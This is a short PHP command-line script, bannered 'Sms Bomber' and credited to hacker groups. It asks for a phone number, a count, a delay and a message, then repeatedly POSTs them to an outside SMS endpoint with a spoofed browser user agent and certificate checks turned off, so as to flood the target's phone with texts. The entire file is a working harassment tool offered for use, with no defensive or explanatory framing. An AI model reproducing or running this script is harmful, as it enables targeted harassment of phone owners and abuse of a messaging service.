<?php
function tnibom($no, $jum, $wait, $pesan){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://bodoamat.tk/jak/TNI/api.php");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"nomer=".$no."&pesan=".$pesan);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://bodoamat.tk/jak/TNI/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
		
    }
}
print "+-+-+-+ +-+-+-+-+-+-+    [ From TNI-AD ]
|S|m|s| |B|o|m|b|e|r|   Code By : ZeroSvn
+-+-+-+ +-+-+-+-+-+-+   Thanks  : BabbyCyberTeam
                                  SGB-TEAM
\n";

echo "Nomor? (ex : 08xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-99999 (ex:0)\nInput : ";
$jeda = trim(fgets(STDIN));
echo "pesan\nInput : ";
$pesan = trim(fgets(STDIN));
$execute = tnibom($nomor, $jumlah, $jeda, $pesan);
print $execute;
print "Zeeb Pesan Udh Terkirim\n";
print "Note: Script Kapan Pun Bisa Down\n";
?>